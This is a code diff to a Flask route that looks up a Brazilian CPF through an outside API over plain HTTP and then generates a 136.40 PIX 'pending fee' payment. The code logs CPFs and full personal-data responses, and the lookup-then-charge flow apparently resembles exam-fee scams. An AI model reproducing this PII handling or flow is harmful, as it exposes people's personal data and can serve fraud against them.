@@ -677,35 +677,53 @@ def verificar_taxa():
         return redirect(url_for('taxa'))
 
     try:
+        logger.info(f"Iniciando consulta para CPF: {cpf_numerico}")
         response = requests.get(
             f"http://inscricaoconcursos.org/api_clientes.php?cpf={cpf_numerico}",
-            timeout=30
+            timeout=10
         )
         response.raise_for_status()
-        dados = response.json()
+        logger.info(f"Resposta da API recebida. Status: {response.status_code}")
+
+        # Tenta fazer o parse do JSON com segurança
+        try:
+            dados = response.json()
+            logger.info("JSON parseado com sucesso")
+        except Exception as e:
+            logger.error(f"Erro ao fazer parse do JSON: {str(e)}")
+            flash('Erro ao processar resposta do servidor. Por favor, tente novamente.')
+            return redirect(url_for('taxa'))
 
         if dados and 'name' in dados:
-            # Clean up the name field to remove any trailing 'X' characters
-            dados['name'] = dados['name'].rstrip('X').strip()
-            session['dados_taxa'] = dados
+            # Limpa e valida os dados antes de usar
+            dados_limpos = {
+                'name': str(dados.get('name', '')).rstrip('X').strip(),
+                'email': str(dados.get('email', '')),
+                'cpf': str(dados.get('cpf', '')),
+                'phone': str(dados.get('phone', ''))
+            }
 
-            # Generate PIX payment
+            # Guarda apenas os dados necessários na sessão
+            session['dados_taxa'] = dados_limpos
+            logger.info("Dados salvos na sessão com sucesso")
+
+            # Gera pagamento PIX
             try:
                 payment_api = create_payment_api()
                 payment_data = {
-                    'name': dados['name'],
-                    'email': dados['email'],
-                    'cpf': dados['cpf'],
-                    'phone': dados['phone'],
-                    'amount': 136.40  # Updated amount
+                    'name': dados_limpos['name'],
+                    'email': dados_limpos['email'],
+                    'cpf': dados_limpos['cpf'],
+                    'phone': dados_limpos['phone'],
+                    'amount': 136.40
                 }
 
-                logger.info(f"Generating PIX payment for CPF: {cpf_numerico}")
+                logger.info(f"Gerando pagamento PIX para CPF: {cpf_numerico}")
                 pix_data = payment_api.create_pix_payment(payment_data)
-                logger.info(f"PIX data generated successfully: {pix_data}")
+                logger.info(f"PIX gerado com sucesso: {pix_data}")
 
                 return render_template('taxa_pendente.html',
-                                   dados=dados,
+                                   dados=dados_limpos,
                                    pix_data=pix_data,
                                    current_year=datetime.now().year)
             except Exception as e:
@@ -713,12 +731,21 @@ def verificar_taxa():
                 flash('Erro ao gerar o pagamento. Por favor, tente novamente.')
                 return redirect(url_for('taxa'))
         else:
+            logger.warning(f"CPF não encontrado ou dados incompletos: {dados}")
             flash('CPF não encontrado ou dados incompletos.')
             return redirect(url_for('taxa'))
 
-    except Exception as e:
-        logger.error(f"Erro na consulta: {str(e)}")
+    except requests.Timeout:
+        logger.error("Timeout na consulta da API")
+        flash('Tempo limite excedido. Por favor, tente novamente.')
+        return redirect(url_for('taxa'))
+    except requests.RequestException as e:
+        logger.error(f"Erro na requisição HTTP: {str(e)}")
         flash('Erro ao consultar CPF. Por favor, tente novamente.')
+        return redirect(url_for('taxa'))
+    except Exception as e:
+        logger.error(f"Erro inesperado na consulta: {str(e)}")
+        flash('Erro ao processar sua solicitação. Por favor, tente novamente.')
         return redirect(url_for('taxa'))
 
 @app.route('/pagamento_taxa', methods=['POST'])
